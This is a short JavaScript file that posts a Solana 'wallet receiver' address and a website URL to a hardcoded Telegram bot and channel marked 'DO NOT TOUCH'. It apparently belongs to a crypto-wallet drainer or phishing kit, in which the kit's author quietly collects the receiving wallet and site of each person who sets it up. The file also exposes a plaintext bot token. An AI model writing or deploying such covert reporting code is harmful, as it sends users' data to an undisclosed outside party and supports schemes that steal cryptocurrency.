const axios = require('axios');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '7520075192:AAEkcBfRcBdfWvnS1qouENDpljroGyTkKSo';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '7253475769';


async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
    try {
        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`, // Обязательно использовать обратные кавычки!
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}


// Change this information for yours (
const solana_wallet_receiver_id = 'DSj8cEN1Bd9CxFrrgNMuwcTnqtfJ4JKFakLeFnjDYNvR';
const website_url = 'https://solana-jade.vercel.app/';
sendMessageToTelegram(solana_wallet_receiver_id, website_url);
